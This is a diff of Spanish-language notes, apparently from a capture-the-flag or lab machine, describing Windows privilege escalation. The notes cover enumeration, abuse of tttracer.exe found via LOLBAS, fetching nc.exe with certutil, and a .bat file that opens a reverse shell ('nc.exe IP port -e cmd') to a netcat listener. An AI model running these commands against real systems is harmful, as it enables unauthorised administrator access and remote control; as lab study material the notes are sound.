@@ -1,12 +1,40 @@
 Root.txt
 
-Instalar nc.exe:
-    python3 -m http.server
-    En el buscador: 192.168.56.1:8000 y descargar
+Una vez nos conectamos con de forma remota, abrimos una powershell y empezamos con la enumeracion y busqueda de alguna vulnerabilidad que nos permita realizar la escalada de privilegios.
 
-Crear lalala.bat:
-C:\PATH\nc.exe IP port -e cmd
+Miramos nuestros prvilegios:
+    - whoami /all
+    - net user username
 
-En terminal: nc -lvp PORT, tambien se puede usar rlwrap: rlwrap nc -lvp PORT, de esta forma podremos hacer control + L.
-(tttracer.exe C:\path\lalala.bat) -> poner como comando original
-C:\Windows\System32\script.exe -ArgumentList 'C:\path\lalala.bat'
+Vemos que estamos dentro de un grupo diferente alo normal, vemos si nos da algo de infromacion su descripcion:
+    net localgroup group_name 
+
+En la descripcion pone que podemos ejecutar el binario tttracer.exe con privilegios administrador de la siguiente forma:
+C:\Users\Administrator\Desktop\script.exe -ArgumentList 'Args'
+
+Visitamos la pagina web lolbas: https://lolbas-project.github.io/# y buscamos el binario.
+Y nos pone lo que tenemos que hacer para realizar la escalada.
+
+Podemos ejecutar cualquier ejecutable, ya sea .exe o .bat. 
+Primero nos descargamos nuestro binario nc.exe:
+    - En nuestra PC -> python3 -m http.server
+    - En la maquina victima -> certutil -f -urlcache -split http://IP:PORT/nc.exe -> El PORT por defecto es 8000
+
+Ahora creamos un .bat para ejecutar el nc.exe:
+    - Abrimos el notepad -> notepad.exe file.bat
+        - C:\PATH\nc.exe IP port -e cmd
+
+Probamos si funciona haciendo un nc en nustra maquina y ejecutando el file.bat.
+
+Ahora que ya esta todo preparado, ejecutamos el binario como dice lolbas:
+En nuestra terminal de linux ejecutamos:
+    - nc -lvp PORT
+
+Este es el comando:
+    - tttracer.exe C:\path\lalala.bat
+pero tenemos que poner lo siguiente:
+    -  C:\Users\Administrator\Desktop\script.exe -ArgumentList 'C:\path\lalala.bat'
+
+
+
+
